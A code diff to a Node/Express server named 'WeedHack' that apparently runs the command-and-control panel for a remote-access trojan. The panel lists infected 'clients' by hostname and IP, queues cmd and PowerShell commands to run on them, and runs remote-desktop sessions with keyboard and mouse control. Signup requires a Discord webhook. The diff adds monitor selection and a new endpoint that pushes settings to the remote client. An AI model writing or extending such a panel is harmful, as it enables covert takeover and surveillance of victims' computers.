@@ -15,9 +15,9 @@ import https from 'node:https';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import db, { UPLOAD_DIR } from './db.js';
-
+import { startUdp, sendInput, sendCfg, getFrame, getMonitors } from './net.js';
 import { handleRpc } from './tcp_rpc.js';
-import { startUdp, sendInput, getFrame, getMonitors } from './net.js';
+
 const __dirname  = path.dirname(fileURLToPath(import.meta.url));
 const PUBLIC_DIR = path.join(__dirname, 'public');
 
@@ -103,7 +103,8 @@ const limitGlobal = limit({
     req.path.endsWith('/input') ||
     req.path.endsWith('/monitors') ||
     req.path.endsWith('/rdp/start') ||
-    req.path.endsWith('/rdp/stop'),
+    req.path.endsWith('/rdp/stop') ||
+    req.path.endsWith('/rdp/update'),
 });
 const limitAuth     = limit({ windowMs: 15 * 60_000, max: 20,  message: { error: 'too many attempts, slow down' } });
 const limitWebhook  = limit({ windowMs: 60 * 60_000, max: 5,   message: { error: 'webhook test limit reached' } });
@@ -161,14 +162,12 @@ app.use(express.static(PUBLIC_DIR, {
   },
 }));
 
-// ---------- health ----------
 app.get('/api/health', (_req, res) => {
   res.json({ ok: true, uptime: Math.round(process.uptime()),
              http: CFG.httpPort, tcp: CFG.tcpPort, udp: CFG.udpPort,
              time: new Date().toISOString() });
 });
 
-// ---------- signup ----------
 app.post('/api/signup', limitAuth, async (req, res) => {
   const { username, email, password, discordWebhook } = req.body || {};
   if (!username || !email || !password || !discordWebhook)
@@ -193,9 +192,9 @@ app.post('/api/signup', limitAuth, async (req, res) => {
   });
   if (!webhookOk) return res.status(400).json({ error: 'webhook unreachable — check the url' });
 
-  const hash        = await bcrypt.hash(password, 12);
-  const accountKey  = genKey();
-  const loginToken  = genLoginTok();
+  const hash       = await bcrypt.hash(password, 12);
+  const accountKey = genKey();
+  const loginToken = genLoginTok();
 
   const info = db.prepare(sql`
     INSERT INTO users (username, email, password_hash, account_key, login_token, discord_webhook, created_at)
@@ -220,7 +219,6 @@ app.post('/api/signup', limitAuth, async (req, res) => {
   res.json({ ok: true, accountKey, loginToken, username });
 });
 
-// ---------- signin (username+password OR login_token+password) ----------
 app.post('/api/signin', limitAuth, async (req, res) => {
   const { username, loginToken, password } = req.body || {};
   if (!password) return res.status(400).json({ error: 'missing password' });
@@ -241,13 +239,8 @@ app.post('/api/signin', limitAuth, async (req, res) => {
 app.post('/api/logout', (_req, res) => { res.clearCookie('token'); res.json({ ok: true }); });
 
 app.get('/api/me', requireAuth, (req, res) => {
-  let row = getOwnUser(req.user.uid);
+  const row = getOwnUser(req.user.uid);
   if (!row) return res.status(404).json({ error: 'not found' });
-  if (!row.login_token) {
-    const tok = genLoginTok();
-    db.prepare(sql`UPDATE users SET login_token = ? WHERE id = ?`).run(tok, req.user.uid);
-    row.login_token = tok;
-  }
   res.json({
     username: row.username,
     email: row.email,
@@ -271,15 +264,13 @@ app.post('/api/webhook/test', requireAuth, limitWebhook, async (req, res) => {
 });
 
 app.get('/api/clients', requireAuth, (req, res) => {
-  const status = String(req.query.status || 'all').toLowerCase();   // all | online | offline
+  const status = String(req.query.status || 'all').toLowerCase();
   const q      = String(req.query.q || '').trim();
   const limitN = Math.min(Math.max(Number(req.query.limit  || 50),  1), 200);
   const offset = Math.max(Number(req.query.offset || 0), 0);
   const now    = Date.now();
   const cutoff = now - 30_000;
 
-  // dynamic where — built from fixed fragments, no user data interpolated.
-  // all values are bound via ? params. the sql guard doesn't apply here.
   const filters = ['user_id = ?'];
   const params  = [req.user.uid];
 
@@ -291,18 +282,18 @@ app.get('/api/clients', requireAuth, (req, res) => {
   }
   const where = filters.join(' AND ');
 
-  const totalRow   = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE ${where}`).get(...params);
-  const rows       = db.prepare(`
+  const totalRow = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE ${where}`).get(...params);
+  const rows = db.prepare(`
     SELECT id, hostname, ip, last_seen FROM clients
     WHERE ${where}
     ORDER BY last_seen DESC
     LIMIT ? OFFSET ?
   `).all(...params, limitN, offset);
 
-  const onlineRow  = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE user_id = ? AND last_seen >= ?`)
-                       .get(req.user.uid, cutoff);
+  const onlineRow = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE user_id = ? AND last_seen >= ?`)
+    .get(req.user.uid, cutoff);
   const offlineRow = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE user_id = ? AND last_seen < ?`)
-                       .get(req.user.uid, cutoff);
+    .get(req.user.uid, cutoff);
 
   res.json({
     total:   Number(totalRow.n),
@@ -351,12 +342,15 @@ app.post('/api/clients/:id/exec', requireAuth, (req, res) => {
   if (!['cmd', 'powershell'].includes(shell)) return res.status(400).json({ error: 'bad shell' });
   if (typeof line !== 'string' || !line.trim() || line.length > 4096)
     return res.status(400).json({ error: 'bad line' });
+
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
+
   const info = db.prepare(sql`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, ?, ?, 'pending', ?)
   `).run(req.user.uid, clientId, shell, line, Date.now());
+
   res.json({ ok: true, commandId: Number(info.lastInsertRowid) });
 });
 
@@ -370,14 +364,12 @@ app.get('/api/clients/:id/commands', requireAuth, (req, res) => {
   res.json(rows);
 });
 
-// delete client
 app.delete('/api/clients/:id', requireAuth, (req, res) => {
   const clientId = Number(req.params.id);
   const info = db.prepare(sql`DELETE FROM clients WHERE id = ? AND user_id = ?`).run(clientId, req.user.uid);
   if (info.changes === 0) return res.status(404).json({ error: 'not found' });
   res.json({ ok: true });
 });
-
 
 // ---------- rdp ----------
 app.post('/api/clients/:id/rdp/start', requireAuth, (req, res) => {
@@ -386,12 +378,13 @@ app.post('/api/clients/:id/rdp/start', requireAuth, (req, res) => {
   if (!client) return res.status(404).json({ error: 'client not found' });
 
   const cfg = {
+    monitor:  Number(req.body.monitor  || 0),
     width:    Math.min(Math.max(Number(req.body.width  || 1280), 320), 3840),
     height:   Math.min(Math.max(Number(req.body.height || 720),  240), 2160),
     quality:  Math.min(Math.max(Number(req.body.quality || 50),   10),  90),
     fps:      Math.min(Math.max(Number(req.body.fps     || 10),    1),  30),
-    keyboard: req.body.keyboard !== false,
-    mouse:    req.body.mouse    !== false,
+    keyboard: req.body.keyboard === true,
+    mouse:    req.body.mouse === true,
   };
 
   db.prepare(sql`
@@ -411,6 +404,14 @@ app.post('/api/clients/:id/rdp/stop', requireAuth, (req, res) => {
     VALUES (?, ?, 'rdp', '{"stop":true}', 'pending', ?)
   `).run(req.user.uid, cid, Date.now());
   res.json({ ok: true });
+});
+
+app.post('/api/clients/:id/rdp/update', requireAuth, (req, res) => {
+  const cid = Number(req.params.id);
+  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
+  if (!client) return res.status(404).json({ error: 'client not found' });
+  const ok = sendCfg(cid, JSON.stringify(req.body || {}));
+  res.json({ ok });
 });
 
 app.get('/api/clients/:id/screen', requireAuth, (req, res) => {
@@ -440,12 +441,9 @@ app.post('/api/clients/:id/input', requireAuth, (req, res) => {
   res.json({ ok });
 });
 
-
-
 app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
 app.use((err, _req, res, _next) => { console.error('[http]', err); res.status(500).json({ error: 'server error' }); });
 
-// ---------- udp ----------
 const udpSock = startUdp({
   host: CFG.bindHost, port: CFG.udpPort,
   onMsg: (text, rinfo, s) => {
@@ -453,7 +451,6 @@ const udpSock = startUdp({
   },
 });
 
-// ---------- http ----------
 const httpServer = http.createServer(app);
 httpServer.listen(CFG.httpPort, CFG.bindHost, () => {
   console.log(`[startup] cwd = ${process.cwd()}`);
@@ -461,7 +458,6 @@ httpServer.listen(CFG.httpPort, CFG.bindHost, () => {
   console.log(`WeedHack http  on ${CFG.bindHost}:${CFG.httpPort}`);
 });
 
-// ---------- https ----------
 const tlsHttpServer = https.createServer(tlsOpts, app);
 tlsHttpServer.on('tlsClientError', (e) => console.log(`[tls] client err: ${e.message}`));
 tlsHttpServer.listen(CFG.tcpPort, CFG.bindHost, () => {
@@ -469,7 +465,6 @@ tlsHttpServer.listen(CFG.tcpPort, CFG.bindHost, () => {
   console.log(`WeedHack udp   on ${CFG.bindHost}:${CFG.udpPort}`);
 });
 
-// ---------- shutdown ----------
 let shuttingDown = false;
 function shutdown(sig) {
   if (shuttingDown) return;
